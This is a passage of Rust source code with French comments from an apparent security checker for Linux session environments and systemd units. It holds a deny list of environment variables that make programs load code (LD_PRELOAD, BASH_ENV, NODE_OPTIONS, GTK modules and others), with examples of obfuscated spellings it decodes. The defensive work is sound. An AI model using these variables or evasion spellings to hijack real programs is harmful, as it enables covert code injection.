        cibles.extend(unite(&mut t.r, fichier, &lu.texte, utilisateur, Some(ligne))?);
    }
    cibles.push(environnement_lie(&t.r)?);
    let numero = n.saturating_add(1);
    Ok(temoins::temoin(
        &format!("{}:{numero}", fichier.to_string_lossy()),
        format!("{}:{numero}", court(fichier, &t.r.maison)),
        ligne,
        Some(&temoins::etat_du_contenant(fichier, &lu.octets)?),
        &cibles,
    ))
}

/// Ce qui se lie de l'environnement des sessions : sous ce nom, chaque fichier qui pose des variables, en entier.
const ENVIRONNEMENT: &str = "[env] profils, environment.d, pam_env, systemd, Hyprland";

/// Au plus autant de fichiers lus en suivant leurs « source » (au-delà des fichiers connus) : une chaîne plus longue
/// ne se suit pas.
const SOURCES_MAX: usize = 64;

/// Au plus autant de lignes qui posent des variables hors de la liste sûre, montrées en clair dans le détail.
const VARIABLES_MONTREES: usize = 40;

/// Une variable de la famille « injection » : elle fait charger du code à un programme ou à un interpréteur
/// (bibliothèques, modules, options, fichier lu au démarrage d'un shell). Posée dans un fichier des variables, elle
/// rend chaque ligne non déclarable, au moment du choix comme après : le fichier qu'elle nomme n'est pas lié, et
/// changerait ce que fait la ligne acceptée (deuxième vérification de la campagne E, P1). Les variables qui ne font
/// que dire où chercher (PATH, HOME, XDG_*) ne sont pas de cette famille : leurs fichiers restent liés en entier
/// (limite écrite au modèle de menace).
fn variable_d_injection(nom: &str) -> bool {
    const DEBUTS: [&str; 9] = [
        "LD_",
        "BASH_FUNC_",
        "PYTHON",
        "PERL5",
        "GST_PLUGIN",
        "LUA_PATH",
        "LUA_CPATH",
        "LUA_INIT",
        "OPENSSL_",
    ];
    const NOMS: [&str; 39] = [
        "BASH_ENV",
        "ENV",
        "SHELLOPTS",
        "BASHOPTS",
        "PS4",
        "PERLLIB",
        "RUBYOPT",
        "RUBYLIB",
        "NODE_OPTIONS",
        "NODE_PATH",
        "GCONV_PATH",
        "GTK_MODULES",
        "GTK3_MODULES",
        "GTK_PATH",
        "GTK_EXE_PREFIX",
        "GTK_IM_MODULE_FILE",
        "GDK_PIXBUF_MODULE_FILE",
        "GDK_PIXBUF_MODULEDIR",
        "GIO_EXTRA_MODULES",
        "GIO_MODULE_DIR",
        "QT_PLUGIN_PATH",
        "QT_QPA_PLATFORM_PLUGIN_PATH",
        "QML_IMPORT_PATH",
        "QML2_IMPORT_PATH",
        "LIBGL_DRIVERS_PATH",
        "LIBVA_DRIVERS_PATH",
        "GBM_BACKENDS_PATH",
        "__EGL_VENDOR_LIBRARY_FILENAMES",
        "__EGL_VENDOR_LIBRARY_DIRS",
        "VK_ICD_FILENAMES",
        "VK_DRIVER_FILES",
        "VK_ADD_DRIVER_FILES",
        "VK_LAYER_PATH",
        "VK_ADD_LAYER_PATH",
        "JAVA_TOOL_OPTIONS",
        "_JAVA_OPTIONS",
        "JDK_JAVA_OPTIONS",
        "CLASSPATH",
        "TCLLIBPATH",
    ];
    DEBUTS.iter().any(|d| nom.starts_with(d)) || NOMS.contains(&nom)
}

/// Une ligne telle qu'un lecteur la décode : échappements « \xHH », « \uHHHH », « \UHHHHHHHH », octal « \NNN »
/// décodés, toute autre barre oblique inverse retirée, guillemets retirés, « $ » d'un « $'…' » compris
/// (« L\D_PRELOAD », « "LD_"'PRELOAD' »,
/// « $'\x4c'D_PRELOAD », « \x4cD_PRELOAD » de systemd nomment tous LD_PRELOAD).
fn decodee(l: &str) -> String {
    let mut sortie = String::with_capacity(l.len());
    let mut cs = l.chars().peekable();
    while let Some(c) = cs.next() {
        match c {
            // « $'…' » et « $"…" » : des guillemets (ANSI-C, traduits), pas une lecture de variable.
            '$' if matches!(cs.peek(), Some('\'' | '"')) => {}
            '"' | '\'' => {}
            '\\' => {
                let (base, max) = match cs.peek() {
                    Some('x') => (16, 2),
                    Some('u') => (16, 4),
                    Some('U') => (16, 8),
                    Some('0'..='7') => (8, 3),
                    Some(_) => {
                        if let Some(suivant) = cs.next() {
                            sortie.push(suivant);
                        }
                        continue;
                    }
                    None => continue,
                };
                if base == 16 {
                    cs.next();
                }
                let mut valeur: u32 = 0;
                let mut lus: u32 = 0;
                while lus < max
                    && let Some(chiffre) = cs.peek().and_then(|x| x.to_digit(base))
                {
                    valeur = valeur.saturating_mul(base).saturating_add(chiffre);
                    cs.next();
                    lus = lus.saturating_add(1);
                }
                sortie.push(char::from_u32(valeur).unwrap_or('\u{fffd}'));
            }
            c => sortie.push(c),
        }
    }
    sortie
}

/// La première variable de la famille « injection » (`variable_d_injection`) qu'une ligne peut poser, après
/// décodage : tout mot qui la nomme, sauf une simple lecture (« $NOM », « ${NOM} », « ${#NOM} », « ${!NOM} ») ;
/// « ${NOM=…} » et « ${NOM:=…} » la posent, et comptent. Une lecture ne change rien à ce que lance la ligne
/// acceptée (bash-completion lit SHELLOPTS) ; tout le reste, même « unset » ou un mot qui n'en pose pas, est pris
/// dans le doute pour une écriture.
fn injection_nommee(l: &str) -> Option<String> {
    let texte = decodee(l);
    let octets = texte.as_bytes();
    let mot = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut i = 0usize;
    while i < octets.len() {
        if !octets.get(i).copied().is_some_and(mot) {
            i = i.saturating_add(1);
            continue;
        }
        let debut = i;
        while octets.get(i).copied().is_some_and(mot) {
            i = i.saturating_add(1);
        }
        let Some(nom) = texte.get(debut..i) else { continue };
        if !variable_d_injection(nom) {
            continue;
        }
        let avant = |n: usize| debut.checked_sub(n).and_then(|k| octets.get(k).copied());
        let suite = texte.get(i..).unwrap_or_default();
        let accolade = avant(1) == Some(b'{') && avant(2) == Some(b'$')
            || matches!(avant(1), Some(b'#' | b'!')) && avant(2) == Some(b'{') && avant(3) == Some(b'$');
        let lecture = avant(1) == Some(b'$') || accolade && !(suite.starts_with('=') || suite.starts_with(":="));
        if !lecture {
            return Some(nom.to_string());
        }
    }
    None
}

/// La sorte d'un fichier des variables, qui dit comment il pose une variable pour la session.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Variables {
    /// Un profil ou un fichier qu'il lit : « export A=… », « declare -x », « setenv » (csh), « set -x » (fish).
    Shell,
    /// environment.d, /etc/environment, pam_env : « A=… », « A DEFAULT=… ».
    Cles,
    /// Les réglages du gestionnaire de systemd : DefaultEnvironment=, ManagerEnvironment=.
    Systemd,
    /// Hyprland : « env = A,… ».
    Hypr,
}

impl Variables {
    fn de(f: &Path, hypr: bool) -> Variables {
        let nom = f.file_name().and_then(|n| n.to_str()).unwrap_or_default();
        let chemin = f.to_string_lossy();
        if hypr {
            Variables::Hypr
        } else if chemin.contains("/systemd/") && f.extension().is_some_and(|e| e == "conf") {
            Variables::Systemd
        } else if chemin.contains("/environment.d/")
            || ["environment", "pam_env.conf", ".pam_environment"].contains(&nom)
        {
            Variables::Cles
        } else {
            Variables::Shell
        }
    }
}

/// Les noms des variables qu'une ligne d'un fichier des variables de la sorte `sorte` pose pour la session, pour
/// les montrer (une affectation sans « export » dans un profil reste dans le shell, et ne se montre pas). Pour
/// l'affichage seulement : ce qui se lie est le fichier entier.
fn noms_poses(l: &str, sorte: Variables) -> Vec<String> {
    let identifiant = |m: &str| {
        let mut o = m.bytes();
        o.next().is_some_and(|p| p.is_ascii_alphabetic() || p == b'_')
            && o.all(|x| x.is_ascii_alphanumeric() || x == b'_')
    };
    let net = l.trim_matches([' ', '\t']);
    let mots: Vec<&str> = net.split([' ', '\t']).filter(|m| !m.is_empty()).collect();
    match sorte {
        Variables::Systemd => ["DefaultEnvironment=", "ManagerEnvironment="]
            .iter()
            .find_map(|c| net.strip_prefix(c))
            .map(|v| {
                v.split([' ', '\t'])
                    .filter_map(|m| m.trim_matches(['"', '\'']).split_once('=').map(|(n, _)| n.to_string()))
                    .collect()
            })
            .unwrap_or_default(),
        Variables::Hypr => net
            .strip_prefix("env")
            .map(|v| v.trim_start_matches([' ', '\t']))
            .and_then(|v| v.strip_prefix('='))
            .map(|v| v.split(',').next().unwrap_or_default().trim_matches([' ', '\t']))
            .filter(|n| identifiant(n))
            .map(|n| vec![n.to_string()])
            .unwrap_or_default(),
        Variables::Cles => match mots.first().copied() {
            Some(premier) => match premier.split_once('=') {
                Some((n, _)) if identifiant(n) => vec![n.to_string()],
                None if identifiant(premier)
                    && mots
                        .get(1)
                        .is_some_and(|m| m.starts_with("DEFAULT=") || m.starts_with("OVERRIDE=")) =>
                {
                    vec![premier.to_string()]
                }
                _ => Vec::new(),
            },
            None => Vec::new(),
        },
        Variables::Shell => match mots.first().copied() {
            Some("set") => {
                let exporte = mots
                    .iter()
                    .any(|m| *m == "--export" || (m.starts_with('-') && !m.starts_with("--") && m.contains('x')));
                match mots.iter().skip(1).find(|m| !m.starts_with('-')) {
                    Some(n) if exporte && identifiant(n) => vec![(*n).to_string()],
                    _ => Vec::new(),
                }
            }
            Some("setenv") => mots
                .get(1)
                .filter(|n| identifiant(n))
                .map(|n| vec![(*n).to_string()])
                .unwrap_or_default(),
            Some(c @ ("export" | "declare" | "typeset")) => {
                if c != "export" && !mots.iter().any(|m| m.starts_with('-') && m.contains('x')) {
                    return Vec::new();
                }
                mots.iter()
                    .skip(1)
                    .filter(|m| !m.starts_with('-'))
                    .map(|m| m.split('=').next().unwrap_or(m))
                    .filter(|n| identifiant(n))
                    .map(str::to_string)
                    .collect()
            }
            _ => Vec::new(),
        },
    }
}

/// Les fichiers qui posent des variables pour les sessions et les services de l'utilisateur : les profils (`profils`),
/// Hyprland (`hypr`), environment.d, les réglages du gestionnaire de systemd (DefaultEnvironment=), pam_env, et
/// chaque fichier qu'ils lisent par un « source » écrit en toutes lettres, à tous les niveaux. Chacun est lié par
/// l'empreinte de son contenu entier : une variable posée là après le choix change ce que fait la ligne acceptée sans
/// toucher à un fichier lié ; liée ainsi, elle fait revenir l'alerte (campagne E, F4 ; vérification, N3). Refusé :
/// une variable de la famille « injection » nommée dans l'un d'eux (`variable_d_injection`, après décodage), dont le
/// fichier ne serait pas lié (deuxième vérification, P1). Le détail montre une ligne par sorte de chose liée : les
/// fichiers, les « source » non suivis, les lignes qui posent une variable hors de la liste sûre, en clair (pas une
/// empreinte par fichier : illisible pour un proche). `Err` : un de ces fichiers ne se lit pas en entier, ou un
/// « source » de Hyprland ne dit pas ce qu'il lit.
fn environnement(
    r: &Releveur,
    profils: Vec<std::path::PathBuf>,
    hypr: Vec<std::path::PathBuf>,
) -> Result<(String, temoins::Etat), temoins::Refus> {
    let s = |c: &str| r.sous(Path::new(c));
    let m = |c: &str| r.maison.join(c);
    let mut connus = profils;
    for f in [
        "/etc/systemd/user.conf",
        "/etc/systemd/system.conf",
        "/etc/security/pam_env.conf",
    ] {
        connus.push(s(f));
    }
    for d in [
        "/etc/systemd/user.conf.d",
        "/etc/systemd/system.conf.d",
        "/usr/lib/environment.d",
        "/run/environment.d",
    ] {
        connus.extend(fichiers_de(&s(d), &["conf"]));
    }
    connus.push(m(".config/systemd/user.conf"));
    connus.push(m(".pam_environment"));
    connus.extend(fichiers_de(&m(".config/systemd/user.conf.d"), &["conf"]));
    if let Some(c) = &r.config {
        connus.push(r.sous(&c.join("systemd/user.conf")));
        connus.extend(fichiers_de(&r.sous(&c.join("systemd/user.conf.d")), &["conf"]));
        connus.extend(fichiers_de(&r.sous(&c.join("environment.d")), &["conf"]));
    }
    // Chaque fichier, et s'il se lit comme un fichier de Hyprland : celui qui le lit par « source = » le dit, pas
    // son chemin (deuxième vérification de la campagne E).
    let mut sources: Vec<(std::path::PathBuf, bool)> = connus.into_iter().map(|f| (f, false)).collect();
    sources.extend(hypr.into_iter().map(|f| (f, true)));
    sources.sort();
    sources.dedup();
    let connus = sources.len();
    let mut lus: Vec<(String, String)> = Vec::new();
    let mut non_suivies: Vec<String> = Vec::new();
    let mut posees: Vec<String> = Vec::new();
    let mut rang = 0usize;
    while let Some((f, est_hypr)) = sources.get(rang).cloned() {
        rang = rang.saturating_add(1);
        if rang > connus.saturating_add(SOURCES_MAX) {
            return Err(temoins::Refus(trf!(
                "les fichiers des variables des sessions en lisent plus de {SOURCES_MAX} autres : la chaîne ne se suit pas",
                "the session variable files read more than {SOURCES_MAX} others: the chain cannot be followed"
            )));
        }
        let montre = crate::ui::affichable(&r.montre(&f));
        let lu = match temoins::lire_borne(&f, LECTURE_MAX) {
            Ok(lu) => lu,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => {
                return Err(temoins::Refus(trf!(
                    "{montre} ne se lit pas ({e}) : les variables qu'il pose pour les sessions ne se vérifient pas",
                    "{montre} cannot be read ({e}): the variables it sets for sessions cannot be checked"
                )));
            }
        };
        if !lu.entier {
            return Err(temoins::Refus(trf!(
                "{montre} ne se lit pas en entier",
                "{montre} cannot be read in full"
            )));
        }
        let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
            return Err(octet_refuse(&montre));
        };
        if lus.iter().any(|(c, _)| *c == r.montre(&f)) {
            continue;
        }
        lus.push((r.montre(&f), temoins::sha256_de(&lu.octets)));
        let variables = Variables::de(&f, est_hypr);
        for (n, l) in texte.lines().enumerate() {
            // Un commentaire (« # » en tête, partout dans ces formats) ne pose rien ; sauf s'il finit par « \ » : une
            // ligne continuée selon le lecteur, gardée.
            let net = l.trim_matches([' ', '\t']);
            if net.starts_with('#') && !net.ends_with('\\') {
                continue;
            }
            let numero = n.saturating_add(1);
            if let Some(nom) = injection_nommee(l) {
                return Err(temoins::Refus(trf!(
                    "{montre}:{numero} nomme {}, une variable qui fait charger du code à un programme : le fichier qu'elle désigne n'est pas lié",
                    "{montre}:{numero} names {}, a variable that makes a program load code: the file it designates is not bound",
                    crate::ui::affichable(&nom)
                )));
            }
            if noms_poses(l, variables).iter().any(|nom| !variable_permise(nom)) {
                posees.push(format!(
                    "{montre}:{numero} : {}",
                    crate::ui::couper(&crate::ui::affichable(net), 90)
                ));
            }
        }
        let (suivis, calculees) = sources_lues(r, texte, est_hypr, &montre)?;
        non_suivies.extend(calculees.into_iter().map(|n| format!("{montre}:{n}")));
        for suivi in suivis {
            if !sources.iter().any(|(c, _)| *c == suivi) {
                sources.push((suivi, est_hypr));
            }
        }
    }
    lus.sort();
    // Ce qui se lie : chaque fichier et l'empreinte de son contenu entier, sans langue (un choix fait en anglais vaut
    // en français). Ce qui se montre : quelques lignes lisibles, hors de l'empreinte.
    let mut lie = String::new();
    for (chemin, etat) in &lus {
        lie.push_str(chemin);
        lie.push_str(" : ");
        lie.push_str(etat);
        lie.push('\n');
    }
    let mut montre = vec![trf!(
        "{} fichiers de variables liés en entier : {}",
        "{} variable files bound in full: {}",
        lus.len(),
        lus.iter()
            .map(|(c, _)| crate::ui::affichable(c))
            .collect::<Vec<_>>()
            .join(", ")
    )];
    if !non_suivies.is_empty() {
        montre.push(trf!(
            "« source » non suivis (chemin calculé ou relatif ; le fichier qui l'écrit reste lié) : {}",
            "“source” not followed (computed or relative path; the file that writes it stays bound): {}",
            non_suivies.join(", ")
        ));
    }
    if !posees.is_empty() {
        montre.push(trf!(
            "{} lignes posent une variable hors de la liste sûre (écran, langue, fuseau, terminal) :",
            "{} lines set a variable outside the safe list (display, language, time zone, terminal):",
            posees.len()
        ));
        let reste = posees.len().saturating_sub(VARIABLES_MONTREES);
        montre.extend(posees.into_iter().take(VARIABLES_MONTREES));
        if reste > 0 {
            montre.push(trf!("… et {reste} autres", "… and {reste} more"));
        }
    }
    Ok((
        ENVIRONNEMENT.to_string(),
        temoins::Etat::lie_et_montre(lie.as_bytes(), montre),
    ))
}

/// Un motif de nom de fichier (« * », « ? ») comparé à un nom, comme le fait un joker.
fn joker(motif: &[u8], nom: &[u8]) -> bool {
    match (motif.split_first(), nom.split_first()) {
        (None, None) => true,
        (Some((b'*', reste)), _) => joker(reste, nom) || nom.split_first().is_some_and(|(_, n)| joker(motif, n)),
        (Some((b'?', reste)), Some((_, n))) => joker(reste, n),
        (Some((m, reste)), Some((c, n))) if m == c => joker(reste, n),
        _ => false,
    }
}

/// Les fichiers qu'un fichier des variables (son `texte`) lit à son tour, écrits en toutes lettres, et les numéros des lignes
/// dont le « source » ne se suit pas. Hyprland (`hypr`) : « source = … », par un chemin absolu ou sous « ~/ », un
/// joker (« * », « ? ») seulement dans le dernier nom, suivi dans son dossier ; refusé sinon (variable, chemin
/// relatif, accolades), qui lirait on ne sait quoi. Shell : chaque « source » ou « . » en position de commande, même
/// au milieu d'une ligne (« [ -f x ] && . x », « if …; then . x; fi »), par un chemin absolu ou sous « ~/ »,
/// « $HOME/ », guillemets retirés ; un chemin calculé ou relatif ne se suit pas, et se dit dans le détail.
fn sources_lues(
    r: &Releveur,
    texte: &str,
    hypr: bool,
    montre: &str,
) -> Result<(Vec<std::path::PathBuf>, Vec<usize>), temoins::Refus> {
    let maison = |reste: &str| r.maison.join(reste);
    let calcule = |l: &str| {
        temoins::Refus(trf!(
            "{montre} lit « {} », un fichier qui ne se dit pas en toutes lettres : les variables des sessions ne se vérifient pas",
            "{montre} reads “{}”, a file that is not spelled out: the session variables cannot be checked",
            crate::ui::couper(&crate::ui::affichable(l), 80)
        ))
    };
    let mut suivis = Vec::new();
    let mut non_suivies = Vec::new();
    for (n, l) in texte.lines().enumerate() {
        let net = l.trim_matches([' ', '\t']);
        if net.starts_with('#') {
            continue;
        }
        if hypr
            && let Some(v) = net
                .strip_prefix("source")
                .map(|v| v.trim_start_matches([' ', '\t']))
                .and_then(|v| v.strip_prefix('='))
        {
            let v = v.split('#').next().unwrap_or_default().trim_matches([' ', '\t']);
            if v.contains(['$', '[', '{', '`', '"', '\'']) {
                return Err(calcule(l));
            }
            let chemin = if let Some(reste) = v.strip_prefix("~/") {
                maison(reste)
            } else if v.starts_with('/') {
                r.sous(Path::new(v))
            } else {
                return Err(calcule(l));
            };
            let nom = chemin.file_name().and_then(|x| x.to_str()).unwrap_or_default();
            let dossier = chemin.parent().unwrap_or(Path::new("/"));
            if dossier.to_string_lossy().contains(['*', '?']) {
                return Err(calcule(l));
            }
            if nom.contains(['*', '?']) {
                let mut trouves: Vec<std::path::PathBuf> = std::fs::read_dir(dossier)
                    .into_iter()
                    .flatten()
                    .flatten()
                    .filter(|e| {
                        e.file_name()
                            .to_str()
                            .is_some_and(|x| joker(nom.as_bytes(), x.as_bytes()))
                    })
                    .map(|e| e.path())
                    .collect();
                trouves.sort();
                suivis.extend(trouves);
            } else {
                suivis.push(chemin);
            }
            continue;
        }
        // Les mots de la ligne, les séparateurs de commandes à part : « ; », « & », « | », « ( », « ) ».
        let espace: String = net
            .chars()
            .map(|c| {
                if matches!(c, ';' | '&' | '|' | '(' | ')') {
                    ';'
                } else {
                    c
                }
            })
            .collect();
        let espace = espace.replace(';', " ; ");
        let mots: Vec<&str> = espace.split([' ', '\t']).filter(|m| !m.is_empty()).collect();
        let mut commande = true;
        let mut i = 0usize;
        let mut calculee = false;
        while let Some(mot) = mots.get(i).copied() {
            i = i.saturating_add(1);
            if mot == ";" {
                commande = true;
                continue;
            }
            if commande
                && matches!(
                    mot,
                    "then" | "else" | "do" | "if" | "elif" | "while" | "until" | "!" | "{"
                )
            {
                continue;
            }
            if commande && (mot == "." || mot == "source") {
                commande = false;
                let Some(cible) = mots.get(i).copied().filter(|m| *m != ";") else {
                    continue;
                };
                i = i.saturating_add(1);
                let cible: String = cible.chars().filter(|c| !matches!(c, '"' | '\'')).collect();
                let chemin = if let Some(reste) = cible
                    .strip_prefix("~/")
                    .or_else(|| cible.strip_prefix("$HOME/"))
                    .or_else(|| cible.strip_prefix("${HOME}/"))
                {
                    Some(maison(reste))
                } else if cible.starts_with('/') {
                    Some(r.sous(Path::new(&cible)))
                } else {
                    None
                };
                match chemin {
                    Some(c)
                        if !c
                            .to_string_lossy()
                            .contains(['$', '`', '*', '?', '[', '{', '<', '>', '\\']) =>
                    {
                        suivis.push(c);
                    }
                    _ => calculee = true,
                }
                continue;
            }
            commande = false;
        }
        if calculee {
            non_suivies.push(n.saturating_add(1));
        }
    }
    Ok((suivis, non_suivies))
}

/// L'environnement relevé (`environnement`), à lier à une ligne ; son refus sinon.
fn environnement_lie(r: &Releveur) -> Result<(String, temoins::Etat), temoins::Refus> {
    r.environnement.clone().unwrap_or_else(|| {
        Err(temoins::Refus(
            tr!(
                "les variables des sessions n'ont pas été relevées",
                "the session variables were not recorded"
            )
            .to_string(),
        ))
    })
}

/// Le refus d'un fichier dont le contenu ou le chemin n'est pas de l'UTF-8.
fn octet_refuse(fichier: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{fichier} contient un octet qui n'est pas du texte (UTF-8) : ce qui se montre ne serait pas ce qui se lance",
        "{fichier} contains a byte that is not text (UTF-8): what is shown would not be what is started"
    ))
}

/// Au plus autant de fichiers d'ajout (drop-ins) liés pour une unité.
const AJOUTS_MAX: usize = 32;
/// Un fichier d'ajout plus gros n'est pas une configuration.
const AJOUT_MAX: u64 = 1024 * 1024;

/// Les seules directives d'une unité (ou d'un ajout) qui se déclare normale, par section : décrire, ordonner, relancer,
/// borner le temps, la priorité, et les lignes Exec, toutes liées (`lignes_exec`). Toute autre directive (variables
/// lues ailleurs, dossier de travail, racine, dossiers privés ou montés, identifiants, PAM, unité lancée en cas
/// d'échec…) rend la ligne non déclarable : décider par une liste de ce qui est dangereux se contournait à chaque
/// directive oubliée (deuxième vérification de la campagne E, P2) ; on décide par ce qui est sûr.
const DIRECTIVES_PERMISES: [(&str, &[&str]); 3] = [
    (
        "Unit",
        &[
            "Description",
            "Documentation",
            "After",
            "Before",
            // Seulement des cibles (`dependance_permise`) : une cible ne lance rien elle-même.
            "Wants",
            "Requires",
            "PartOf",
            "StartLimitIntervalSec",
            "StartLimitBurst",
        ],
    ),
    (
        "Service",
        &[
            "Type",
            // Le compte qui lance, pas ce qui est lancé (les chemins de la ligne sont absolus et liés) ; et une
            // directive qui ne fait que retirer des droits.
            "User",
            "Group",
            "NoNewPrivileges",
            "ExecStart",
            "ExecStartPre",
            "ExecStartPost",
            "ExecCondition",
            "ExecReload",
            "ExecStop",
            "ExecStopPost",
            "Restart",
            "RestartSec",
            "RemainAfterExit",
            "TimeoutSec",
            "TimeoutStartSec",
            "TimeoutStopSec",
            "Nice",
            // Des noms de `variable_permise` seulement, sans chemin en valeur.
            "Environment",
            "PassEnvironment",
        ],
    ),
    ("Install", &["WantedBy"]),
];

/// Les directives qui lancent une commande : chacune est montrée et liée comme la ligne signalée.
const DIRECTIVES_EXEC: [&str; 7] = [
    "ExecStart",
    "ExecStartPre",
    "ExecStartPost",
    "ExecCondition",
    "ExecReload",
    "ExecStop",
    "ExecStopPost",
];

/// Une dépendance permise (Wants=, Requires=, PartOf=, WantedBy=) : des cibles seulement (« default.target »,
/// « graphical-session.target ») ; une autre unité nommée là serait lancée avec celle-ci, sans être liée.
fn dependance_permise(valeur: &str) -> bool {
    let noms: Vec<&str> = valeur.split([' ', '\t']).filter(|n| !n.is_empty()).collect();
    !noms.is_empty()
        && noms.iter().all(|n| {
            n.strip_suffix(".target")
                .is_some_and(|b| !b.is_empty() && b.bytes().all(|o| o.is_ascii_alphanumeric() || b"-_@.".contains(&o)))
        })
}

/// Les seules variables qu'« Environment= » et « PassEnvironment= » peuvent poser dans une unité qui se déclare
/// normale : l'écran, la langue, le fuseau, le terminal. Aucune ne fait charger du code ni ne change où un programme
/// le cherche. Décider par une liste de ce qui est dangereux se contournait (modules GTK, pilotes GL, BASH_FUNC_…,
/// vérification de la campagne E) : on décide par ce qui est sûr.
fn variable_permise(nom: &str) -> bool {
    const NOMS: [&str; 12] = [
        "DISPLAY",
        "WAYLAND_DISPLAY",
        "LANG",
        "LANGUAGE",
        "TZ",
        "TERM",
        "COLORTERM",
        "NO_COLOR",
        "XDG_SESSION_TYPE",
        "XDG_CURRENT_DESKTOP",
        "XDG_SESSION_DESKTOP",
        "DESKTOP_SESSION",
    ];
    NOMS.contains(&nom)
        || nom
            .strip_prefix("LC_")
            .is_some_and(|r| !r.is_empty() && r.bytes().all(|b| b.is_ascii_uppercase()))
}

/// Les mots d'une valeur de systemd (« Environment= »), coupés sur l'espace et la tabulation hors guillemets,
/// guillemets retirés ; `None` : un échappement (« \ »), que systemd décode (« \x5f » est « _ ») avant de lire le nom
/// (vérification de la campagne E, N3), ou un guillemet non fermé.
fn mots_de_systemd(valeur: &str) -> Option<Vec<String>> {
    if valeur.contains('\\') {
        return None;
    }
    let mut mots = Vec::new();
    let mut mot = String::new();
    let mut dans: Option<char> = None;
    for c in valeur.chars() {
        match (dans, c) {
            (Some(q), c) if c == q => dans = None,
            (None, '"' | '\'') => dans = Some(c),
            (None, ' ' | '\t') => {
                if !mot.is_empty() {
                    mots.push(std::mem::take(&mut mot));
                }
            }
            (_, c) => mot.push(c),
        }
    }
    if dans.is_some() {
        return None;
    }
    if !mot.is_empty() {
        mots.push(mot);
    }
    Some(mots)
}

/// Les lignes d'une unité ou d'un ajout telles que systemd les lit : sans blancs autour, commentaires (« # », « ; »)
/// et lignes vides sautés, lignes continuées par « \\ » jointes (un commentaire au milieu est sauté).
fn lignes_logiques(texte: &str) -> Vec<String> {
    let mut logiques: Vec<String> = Vec::new();
    let mut cours = String::new();
    let mut continue_ = false;
    for l in texte.lines() {
        let l = l.trim_matches([' ', '\t']);
        if l.starts_with(['#', ';']) || (l.is_empty() && !continue_) {
            continue;
        }
        if let Some(debut) = l.strip_suffix('\\') {
            cours.push_str(debut);
            cours.push(' ');
            continue_ = true;
        } else {
            cours.push_str(l);
            logiques.push(std::mem::take(&mut cours));
            continue_ = false;
        }
    }
    if continue_ {
        logiques.push(cours);
    }
    logiques
}

/// Les lignes Exec*= d'une unité ou d'un ajout : la directive, sa commande, la ligne entière.
fn lignes_exec(texte: &str) -> Vec<(String, String, String)> {
    lignes_logiques(texte)
        .into_iter()
        .filter_map(|l| {
            let (cle, valeur) = l.split_once('=')?;
            let cle = cle.trim_matches([' ', '\t']);
            DIRECTIVES_EXEC
                .contains(&cle)
                .then(|| (cle.to_string(), valeur.trim_matches([' ', '\t']).to_string(), l.clone()))
        })
        .collect()
}

/// La valeur d'une variable permise, sans chemin : un chemin (« LC_ALL=/x », « LANGUAGE=../x ») ferait lire un
/// fichier que rien ne lie. Seul TZ garde un nom de zone (« America/Toronto »), lu sous les zones du système, sans
/// « : » ni « .. » ni chemin absolu (deuxième vérification de la campagne E).
fn valeur_permise(nom: &str, valeur: &str) -> bool {
    if nom == "TZ" {
        return !valeur.starts_with('/')
            && valeur.split('/').all(|p| {
                !p.is_empty() && p != ".." && p.bytes().all(|o| o.is_ascii_alphanumeric() || b"-_+".contains(&o))
            })
            || valeur.is_empty();
    }
    !valeur.contains(['/', '\\'])
}

/// La première directive d'une unité ou d'un ajout qui n'est pas dans la liste fermée (`DIRECTIVES_PERMISES`), ou
/// qui y est avec une valeur hors des permises (une dépendance qui n'est pas une cible, une ligne Exec vide qui
/// efface les précédentes, une variable hors de `variable_permise` ou avec un chemin), telle qu'à montrer.
fn directive_refusee(texte: &str) -> Option<String> {
    let mut section: Option<&str> = None;
    let logiques = lignes_logiques(texte);
    for l in &logiques {
        if let Some(nom) = l.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
            match DIRECTIVES_PERMISES.iter().find(|(s, _)| *s == nom) {
                Some((s, _)) => section = Some(s),
                None => return Some(format!("[{}]", crate::ui::affichable(nom))),
            }
            continue;
        }
        let Some((cle, valeur)) = l.split_once('=') else {
            return Some(crate::ui::couper(&crate::ui::affichable(l), 40));
        };
        let cle = cle.trim_matches([' ', '\t']);
        let valeur = valeur.trim_matches([' ', '\t']);
        let permise = section.is_some_and(|s| {
            DIRECTIVES_PERMISES
                .iter()
                .any(|(n, cles)| *n == s && cles.contains(&cle))
        });
        if !permise {
            return Some(format!("{}=", crate::ui::affichable(cle)));
        }
        if ["Wants", "Requires", "PartOf", "WantedBy"].contains(&cle) && !dependance_permise(valeur) {
            return Some(format!(
                "{cle}={}",
                crate::ui::couper(&crate::ui::affichable(valeur), 40)
            ));
        }
        if DIRECTIVES_EXEC.contains(&cle) && valeur.is_empty() {
            return Some(format!("{cle}= ({})", tr!("vide", "empty")));
        }
        if cle == "Environment" || cle == "PassEnvironment" {
            let Some(mots) = mots_de_systemd(valeur) else {
                return Some(format!("{cle}=\\…"));
            };
            for mot in mots {
                let (nom, v) = mot.split_once('=').unwrap_or((&mot, ""));
                if !variable_permise(nom) || !valeur_permise(nom, v) {
                    return Some(format!("{cle}={}", crate::ui::affichable(nom)));
                }
            }
        }
    }
    None
}

/// Les dossiers où systemd cherche les unités, du plus prioritaire au moins prioritaire (systemd.unit(5)).
fn dossiers_d_unites(r: &Releveur, utilisateur: bool) -> Result<Vec<std::path::PathBuf>, temoins::Refus> {
    let s = |c: &str| r.sous(Path::new(c));
    if !utilisateur {
        return Ok([
            "/etc/systemd/system.control",
            "/run/systemd/system.control",
            "/run/systemd/transient",
            "/run/systemd/generator.early",
            "/etc/systemd/system",
            "/etc/systemd/system.attached",
            "/run/systemd/system",
            "/run/systemd/generator",
            "/usr/local/lib/systemd/system",
            "/usr/lib/systemd/system",
            "/run/systemd/generator.late",
        ]
        .iter()
        .map(|c| s(c))
        .collect());
    }
    let Some(session) = r.runtime.as_deref() else {
        return Err(temoins::Refus(
            tr!(
                "le dossier de la session (XDG_RUNTIME_DIR) est inconnu : ce que systemd y ajoute à l'unité ne se vérifie pas",
                "the session folder (XDG_RUNTIME_DIR) is unknown: what systemd adds to the unit there cannot be checked"
            )
            .to_string(),
        ));
    };
    let run = |c: &str| r.sous(&session.join(c));
    let m = |c: &str| r.maison.join(c);
    // Un XDG_CONFIG_HOME ou XDG_DATA_HOME déplacé : systemd y cherche aussi, en plus des dossiers par défaut (que le
    // gestionnaire de la session lit peut-être, sans ces variables).
